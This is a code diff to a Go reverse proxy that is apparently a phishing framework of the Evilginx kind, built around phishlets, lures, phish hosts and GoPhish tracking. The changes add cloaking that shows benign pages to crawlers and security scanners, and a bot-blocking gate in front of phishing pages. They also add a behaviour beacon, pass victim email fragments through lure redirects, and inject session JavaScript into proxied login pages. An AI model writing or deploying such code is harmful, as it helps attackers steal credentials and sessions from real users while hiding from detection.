@@ -182,41 +182,106 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
 
 			// handle proxy headers
-			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP", "X-Proxy-Id", "CF-Connecting-IP"}
-			for _, h := range proxyHeaders {
-				origin_ip := req.Header.Get(h)
-				if origin_ip != "" {
-					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
-					break
-				}
-			}
+						// Trust order for real client IP:
+						// 1. CF-Connecting-IP — set by Cloudflare, cannot be spoofed through CF
+						// 2. True-Client-IP   — Cloudflare Enterprise
+						// 3. LAST entry of X-Forwarded-For — the hop closest to us; earlier
+						//    entries are client-spoofable, so never trust the first one
+						if cip := req.Header.Get("CF-Connecting-IP"); cip != "" {
+							from_ip = strings.SplitN(strings.TrimSpace(cip), ",", 2)[0]
+						} else if cip := req.Header.Get("True-Client-IP"); cip != "" {
+							from_ip = strings.SplitN(strings.TrimSpace(cip), ",", 2)[0]
+						} else {
+							proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "Client-IP", "X-Proxy-Id"}
+							for _, h := range proxyHeaders {
+								origin_ip := req.Header.Get(h)
+								if origin_ip != "" {
+									// take the LAST (closest) hop, not the first (spoofable)
+									parts := strings.Split(origin_ip, ",")
+									last := strings.TrimSpace(parts[len(parts)-1])
+									if last != "" {
+										from_ip = strings.SplitN(last, ":", 2)[0]
+										break
+									}
+								}
+							}
+						}
+
+					// Handle beacon endpoint directly on phish domain (bypasses dashboard)
+							if req.URL.Path == "/api/beacon" && req.Method == "POST" {
+								var data map[string]interface{}
+								if err := json.NewDecoder(req.Body).Decode(&data); err == nil {
+									if bt, ok := data["type"].(string); ok {
+										GetCloak().RecordBehavior(from_ip, bt)
+									}
+								}
+								// Return 204 No Content
+								resp := goproxy.NewResponse(req, "text/plain", http.StatusNoContent, "")
+								return req, resp
+							}
 
 			// log.Debug("xxxxxxxxxxxxxxxxxxxxx\n %s xx", p.cfg.general.Chatid)
 
 			if p.cfg.GetBlacklistMode() != "off" {
-				if p.bl.IsBlacklisted(from_ip) {
-					if p.bl.IsVerbose() {
-						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
-					}
-					return p.blockRequest(req)
-				}
-				if p.cfg.GetBlacklistMode() == "all" {
-					if !p.bl.IsWhitelisted(from_ip) {
-						err := p.bl.AddIP(from_ip)
-						if p.bl.IsVerbose() {
-							if err != nil {
-								log.Error("blacklist: %s", err)
-							} else {
-								log.Warning("blacklisted ip address: %s", from_ip)
+						if p.bl.IsBlacklisted(from_ip) {
+							if p.bl.IsVerbose() {
+								log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
 							}
+							return p.blockRequest(req)
+						}
+						if p.cfg.GetBlacklistMode() == "all" {
+							if !p.bl.IsWhitelisted(from_ip) {
+								err := p.bl.AddIP(from_ip)
+								if p.bl.IsVerbose() {
+									if err != nil {
+										log.Error("blacklist: %s", err)
+									} else {
+										log.Warning("blacklisted ip address: %s", from_ip)
+									}
+								}
+							}
+							return p.blockRequest(req)
 						}
 					}
 
-					return p.blockRequest(req)
-				}
-			}
+					// Cloaking check - serve benign page to crawlers/security scanners
+						// Use the already-extracted from_ip (from proxy headers) for consistency
+						if GetCloak().IsCrawlerWithIP(req, from_ip) {
+							log.Debug("cloak: blocked crawler request from %s UA: %s", from_ip, req.UserAgent())
+							log.Debug("cloak: BotCallback=%v", p.BotCallback != nil)
+							if p.BotCallback != nil {
+								log.Debug("cloak: calling BotCallback")
+								p.BotCallback()
+								log.Debug("cloak: BotCallback returned")
+							} else {
+								log.Warning("cloak: BotCallback is nil, counter won't increment")
+							}
+							return req, GetCloak().ServeBenignResponse(req)
+						}
 
-			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
+						// Human-verification gate — every request to a phish host must
+							// hold a valid human token (earned by trusted interaction) before
+							// it can reach the phishlet. Bots without real user activation
+							// never get past the interstitial.
+							if GetCloak().config.Enabled {
+								if p.getPhishletByPhishHost(req.Host) != nil {
+									if gateHandles(req.URL.Path) {
+										// gate endpoints always route through GateCheck
+										if resp := GetCloak().GateCheck(from_ip, req); resp != nil {
+											return req, resp
+										}
+										GetCloak().TouchRequest(from_ip, req.UserAgent())
+									} else if shouldGate(req.URL.Path) {
+										if resp := GetCloak().GateCheck(from_ip, req); resp != nil {
+											return req, resp
+										}
+										// passed the gate — record profile activity
+										GetCloak().TouchRequest(from_ip, req.UserAgent())
+									}
+								}
+							}
+
+						req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 			o_host := req.Host
 			lure_url := req_url
 			req_path := req.URL.Path
@@ -400,7 +465,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									// set params from url arguments
 									p.extractParams(session, req.URL)
 
-									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
+											// Extract fragment from query param (passed by redirector) or from request URL fragment
+											// Note: browser doesn't send fragment to server, but redirector page can pass it via ?frag=...
+											fragment := req.URL.Query().Get("frag")
+											if fragment != "" {
+												session.Params["fragment"] = fragment
+											}
+
+											if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 										if trackParam, ok := session.Params["o"]; ok {
 											if trackParam == "track" {
 												// gophish email tracker image
@@ -525,11 +597,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 											html = p.injectOgHeaders(l, html)
 
-											body := string(html)
-											body = p.replaceHtmlParams(body, lure_url, &s.Params)
-											body = strings.Replace(body, "{session_id}", s.Id, -1)
+															body := string(html)
+															body = p.replaceHtmlParams(body, lure_url, &s.Params)
+															body = strings.Replace(body, "{session_id}", s.Id, -1)
 
-											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
+															// Inject fragment if present in session params
+															if frag, ok := s.Params["fragment"]; ok && frag != "" {
+																fragEsc := strings.NewReplacer("&", "&amp;", "<", "&lt;", ">", "&gt;", "\"", "&quot;").Replace(frag)
+																body = strings.Replace(body, "{fragment}", fragEsc, -1)
+															}
+
+															resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 											if resp != nil {
 												return req, resp
 											} else {
@@ -600,15 +678,31 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				// redirect to login page if triggered lure path
-				if pl != nil {
-					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
-					if err == nil {
-						// redirect from lure path to login url
-						rurl := pl.GetLoginUrl()
-						if newUrl, ok := p.replaceUrlWithPhished(rurl); ok {
-							rurl = newUrl
-						}
-						u, err := url.Parse(rurl)
+						if pl != nil {
+							_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
+							if err == nil {
+								// redirect from lure path to login url
+								rurl := pl.GetLoginUrl()
+								if newUrl, ok := p.replaceUrlWithPhished(rurl); ok {
+									rurl = newUrl
+								}
+								// preserve URL fragment (e.g. #email@victim.com) through the redirect —
+								// browsers only re-attach the original fragment if Location has none
+								if req.URL.Fragment != "" && !strings.Contains(rurl, "#") {
+									rurl += "#" + req.URL.Fragment
+									log.Debug("lure redirect: preserved fragment to login url")
+								}
+								// Preserve fragment through redirect chain
+								if s, ok := p.sessions[ps.SessionId]; ok {
+									if frag, ok := s.Params["fragment"]; ok && frag != "" {
+										sep := "?"
+										if strings.Contains(rurl, "?") {
+											sep = "&"
+										}
+										rurl += sep + "frag=" + url.QueryEscape(frag)
+									}
+								}
+								u, err := url.Parse(rurl)
 						if err == nil {
 							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
 								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
@@ -1334,15 +1428,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if phHost, ok := p.replaceHostWithPhished(req_hostname); ok {
 								phishScriptHost = phHost
 							}
-							js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
+							_, script, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
 							if err == nil {
-								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("https://%s/s/%s/%s.js", phishScriptHost, s.Id, js_id))
-								body = p.injectJavascriptIntoHead(body, "", fmt.Sprintf("https://%s/s/%s/%s.js", phishScriptHost, s.Id, js_id))
+								// Inject all matching scripts (concatenated with clear separator) —
+								// body only, NOT head too (double injection = duplicate pollers)
+								scripts := strings.Split(script, "\n\n---\n\n")
+								for _, sc := range scripts {
+									sc = strings.TrimSpace(sc)
+									if sc == "" {
+										continue
+									}
+									body = p.injectJavascriptIntoBody(body, sc, "")
+								}
+								log.Debug("js_inject: injected %d script(s) for hostname: %s path: %s", len(scripts), req_hostname, resp.Request.URL.Path)
 							}
 
+							// dynamic redirect script — body only, once
 							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
 							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("https://%s/s/%s.js", phishScriptHost, s.Id))
-							body = p.injectJavascriptIntoHead(body, "", fmt.Sprintf("https://%s/s/%s.js", phishScriptHost, s.Id))
 						}
 					}
 				}
@@ -1857,8 +1960,7 @@ func (p *HttpProxy) setSessionTmsgid(sid string, tmsgid string) {
 		return
 	}
 	s, ok := p.sessions[sid]
-	log.Debug("ssssssssss%s", s)
-	log.Debug("ssssssssss%s", ok)
+	log.Debug("setSessionTmsgid: sid=%s s=%v ok=%v", sid, s, ok)
 
 	if ok {
 		s.SetTmsgid(tmsgid)
